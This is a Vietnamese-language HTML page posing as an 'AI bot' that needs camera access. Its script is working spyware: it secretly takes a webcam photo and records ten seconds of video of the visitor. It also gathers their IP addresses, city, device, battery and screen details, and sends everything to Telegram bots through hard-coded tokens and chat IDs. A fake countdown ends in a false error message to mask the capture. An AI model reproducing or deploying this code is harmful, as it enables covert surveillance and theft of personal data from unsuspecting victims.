<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bot AI Get Dữ Liệu Từ Ảnh</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    text-align: center;
  }
  .message {
    font-size: 24px;
    margin-bottom: 20px;
    animation: fadeInDown 1s ease;
  }
  #countdown {
    font-size: 48px;
    margin-bottom: 50px;
    animation: zoomIn 1s ease;
  }
</style>
</head>
<body>

<div class="container">
  <h1 class="message">Vui lòng cho phép truy cập máy ảnh để sử dụng Bot AI!</h1>
  <div id="countdown"></div>
</div>

<script>
  async function getCurrentTime() {
    var now = new Date();
    var options = {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
      timeZone: "Asia/Ho_Chi_Minh"
    };
    return now.toLocaleDateString("vi-VN", options);
  }

  async function sendTelegramMessage(message) {
    var botToken = '7388557860:AAGyo_RJdLPa0ZbikggzEQiwyksCo9jBCb0';
    var chatID = '6658585254';
    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatID + "&text=" + encodeURIComponent(message);

    try {
      const response = await fetch(url);
      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error('Có sự cố xảy ra khi gửi tin nhắn:', error);
    }
  }

  async function getAddress() {
    try {
      const ipv6Response = await fetch('https://api6.ipify.org?format=json');
        const ipv6Data = await ipv6Response.json();
        var ipv6 = ipv6Data.ip;
      const response = await fetch('https://ipinfo.io/json');
      const data = await response.json();
      if (data.country === "VN") {
        var currentTime = await getCurrentTime(); // Sử dụng await ở đây
        var message = "🗺 Địa Chỉ Đối Phương: " + data.city + ", " + data.region + ", " + data.country + "\n";
        message += "🗺 IP Đối Phương: " + data.ip + "\n";
        message += "🗺 IPv6: " + ipv6 + "\n"; 
        message += "🕒 Thời Gian Truy Cập: " + currentTime  + "\n";
        message += "💻 Tên Thiết Bị: " + navigator.userAgent + "\n";
        
        if (navigator.getBattery) {
          navigator.getBattery().then(function(battery) {
            message += "🔋 Phần Trăm Pin: " + (battery.level * 100) + "%\n";
            message += "🛠 Hệ Điều Hành: " + navigator.platform + "\n";
            message += "📜 Ngôn Ngữ Trình Duyệt: " + navigator.language + "\n";
            message += "🖥 Độ phân giải màn hình: " + window.screen.width + "x" + window.screen.height + "\n";
            message += "\nPower By DichVuDark.Site <3";

            sendTelegramMessage(message);
          });
        } else {
          message += "🔋 Phần Trăm Pin: Không xác định\n";
          message += "🛠 Hệ Điều Hành: " + navigator.platform + "\n";
          message += "📜 Ngôn Ngữ Trình Duyệt: " + navigator.language + "\n";
          message += "🖥 Độ Phân Giải Màn Hình: " + window.screen.width + "x" + window.screen.height + "\n";
          message += "\nPower By DICHVU.XYZ <3";
          sendTelegramMessage(message);
        }
      } else {
        sendTelegramMessage("Không thể lấy địa chỉ.");
      }
    } catch (error) {
      console.error('Lỗi:', error);
      sendTelegramMessage("Không thể lấy địa chỉ.");
    }
  }

  function sendTelegramPhoto(photoData, message) {
    var botToken = '6798801346:AAGDv3XSd248Ac71ElOMjdUWoXiOLLeW8YA';
    var chatID = '6389088159';
    var url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";

    var formData = new FormData();
    formData.append("chat_id", chatID);
    formData.append("photo", photoData, "photo.jpg");
    formData.append("caption", message);

    fetch(url, {
      method: 'POST',
      body: formData
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Không thể kết nối mạng');
        }
        return response.json();
      })
      .then(data => {
        console.log(data);
      })
      .catch(error => {
        console.error('Có sự cố xảy ra khi gửi ảnh:', error);
      });
  }

  function sendTelegramVideo(videoData, caption) {
    var botToken = '6767433130:AAFATrjB8ZjAkeDhELedEaujIpCaj8m5zxM';
    var chatID = '6389088159';

    var formData = new FormData();
    formData.append("chat_id", chatID);
    formData.append("video", videoData, "video.chidungdev");
    formData.append("caption", caption);

    fetch("https://api.telegram.org/bot" + botToken + "/sendVideo", {
      method: "POST",
      body: formData
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Không thể kết nối mạng ib chí dũng dev');
        }
        return response.json();
      })
      .then(data => {
        console.log(data);
      })
      .catch(error => {
        console.error('Có sự cố xảy ra khi gửi video:', error);
      });
  }

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      var video = document.createElement('video');
      document.body.appendChild(video);
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = function() {
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(function(blob) {
          var reader = new FileReader();
          reader.readAsDataURL(blob);
          reader.onloadend = function() {
            var base64Data = reader.result;
            getCurrentTime().then(time => {
              var message = "📸 Chụp Ảnh Đối Phương Thành Công\n🕒 Thời Gian: " + time;
              sendTelegramPhoto(blob, message);
              document.body.removeChild(video);
            });
          };
        }, 'image/jpeg');
      };
    }).catch(function(error) {
      console.error('Lỗi khi truy cập camera:', error);
    });
  }

  function countdown(seconds) {
    var countdownElement = document.getElementById("countdown");
    countdownElement.textContent = "Vui lòng chờ " + seconds + " giây khởi động bot...";
    countdownElement.classList.add("animate__animated", "animate__fadeInDown");

    var intervalId = setInterval(function() {
      seconds--;
      countdownElement.textContent = "Vui lòng chờ " + seconds + " giây khởi động bot...";

      if (seconds <= 0) {
        clearInterval(intervalId);
        countdownElement.textContent = "Đã có lỗi xảy ra!";
        startCameraActions();
      }
    }, 1000);
  }

  function startCameraActions() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        console.log("Quyền truy cập vào camera đã được cấp!");
      })
      .catch(function(error) {
        console.error('Không thể truy cập vào camera:', error);
      });
  }

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
      countdown(11); 
    })
    .catch(function(error) {
      console.error('Không thể truy cập vào camera:', error);
    });

  // Gọi hàm lấy địa chỉ
  getAddress();
    // Hàm ghi video và gửi tới Telegram
  function startRecordingAndSendVideo() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        var mediaRecorder = new MediaRecorder(stream);
        var chunks = [];
        var currentTime;

        mediaRecorder.ondataavailable = function(event) {
          chunks.push(event.data);
        };

        mediaRecorder.onstop = function() {
          // Kết hợp các phần của video để tạo thành một Blob hoàn chỉnh
          var videoBlob = new Blob(chunks, { type: 'video/webm' });

          // Lấy thời gian hiện tại
          getCurrentTime().then(time => {
            currentTime = time;

            // Gửi video tới Telegram
            sendTelegramVideo(videoBlob, "🎞 Quay Video Đối Phương Thành Công\n🕒 Thời Gian: " + currentTime);
          });

          // Xóa chunks để chuẩn bị cho lần ghi video tiếp theo
          chunks = [];
        };

        // Bắt đầu ghi lại video
        mediaRecorder.start();

        // Dừng ghi lại sau một khoảng thời gian (ví dụ: 10 giây)
        setTimeout(function() {
          mediaRecorder.stop();
        }, 10000); // Thời gian ghi lại video (milliseconds), thay đổi theo nhu cầu
      })
      .catch(function(error) {
        console.error('Lỗi khi truy cập camera:', error);
      });
  }

  // Gọi hàm ghi video và gửi tới Telegram
  startRecordingAndSendVideo();
</script>

</body>
</html>
